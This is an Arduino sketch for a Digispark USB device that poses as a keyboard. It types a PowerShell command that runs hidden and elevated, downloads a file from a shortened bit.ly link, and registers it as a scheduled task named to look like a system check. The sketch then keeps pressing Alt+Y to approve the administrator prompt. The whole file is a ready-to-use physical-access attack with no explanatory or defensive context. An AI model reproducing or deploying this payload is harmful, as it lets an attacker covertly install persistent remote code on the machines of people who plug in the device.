#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);
  
  DigiKeyboard.delay(3000);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);

  DigiKeyboard.delay(500);

  DigiKeyboard.print("powershell saps powershell -ArgumentList \\\"`$client = New-Object System.Net.WebClient; `$client.DownloadFile('http://bit.ly/2jfL69K', `$env:temp + '\\sys.xml'); sleep 5; schtasks /create /XML `$env:temp\\sys.xml /tn syscheck01\\\" -WindowStyle Hidden -Verb RunAs");

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  int endTime = 0;

  while (endTime < 1) {

  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(250);
    
  }
  
}
